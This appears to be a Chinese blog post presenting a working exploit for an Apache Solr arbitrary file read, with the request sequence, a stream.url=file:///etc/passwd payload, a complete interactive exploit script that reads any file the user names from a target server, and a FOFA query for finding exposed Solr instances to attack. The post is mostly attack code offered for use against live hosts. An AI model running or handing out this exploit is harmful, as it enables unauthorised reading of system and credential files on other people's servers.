## Apache-Solr任意文件读取exp

2021.3.18的，也就是今天刚出来的

漏洞利用方式很简单，但是网上说的不是很完整。

首先我们需要访问：

    
    
    /solr/admin/cores?indexInfo=false&wt=json
    

然后看相应数据：

    
    
    {
      "responseHeader":{
        "status":0,
        "QTime":0},
      "initFailures":{},
      "status":{
        "ingredients":{
          "name":"ingredients",
          "instanceDir":"/var/solr/data/ingredients",
          "dataDir":"/var/solr/data/ingredients/data/",
          "config":"solrconfig.xml",
          "schema":"schema.xml",
          "startTime":"2021-03-18T11:41:26.398Z",
          "uptime":211644}}}
    
    

差不多这个样子，ingredients就是我们需要的

构造路径：

    
    
    "/solr/".ins."/debug/dump?param=ContentStreams&wt=json"
    

ins就是我们得到的实例对象的名称

他们说会返回xml格式的，网上的都是不带wt=json，但是我发现，dump接受这个参数，也会输出json格式

并且我们在上面获取ins的时候是可以判断服务器类型的

上面的话呢应该是：

    
    
    /solr/ingredients/debug/dump?param=ContentStreams&wt=json
    

然后是个post数据包，路径有了，内容就是：

    
    
    stream.url=file:///etc/passwd
    

然后也会得到一个json，这里就不带结果了

最后附上exp：

    
    
    #define insqian = "name":"
    #define inshou = "
    #define contentqian = "stream":"
    #define contenthou = "}]
    function Getinstance(url){
    	res = HttpGetSafe(url."/solr/admin/cores?indexInfo=false&wt=json","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
    	if(StrFindStr(res[0],"initFailures",0) == "-1"){
    		return "";
    	}
    	return GettextMiddle(res[0],insqian,inshou);
    }
    function GetFileContent(url,ins,FilePath){
    	res = HttpPostSafe(url."/solr/".ins."/debug/dump?param=ContentStreams&wt=json","stream.url=file://".FilePath,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
    	con = GettextMiddle(res[0],contentqian,contenthou);
    	return StrReplace(con,"\\n",StrRN());
    	
    }
    
    function main(args){
    	print("请输入测试的站点:");
    	url = input();
    	ins = Getinstance(url);
    	if(ins == ""){
    		print("不存在漏洞");
    	}else{
    		print("可能存在漏洞,instanceName:".ins.",请输入要查看的文件名称:");
    		wb = input();
    		while(wb != "exit"){
    			print(GetFileContent(url,ins,wb));
    			wb = input();
    		}
    	}
    }
    

带一张效果图:

![image](https://image.3001.net/images/20210318/1616075431_60535aa7ee787ae3236c2.jpg!small)

fofa搜索：

    
    
    app="Apache-Solr"
    

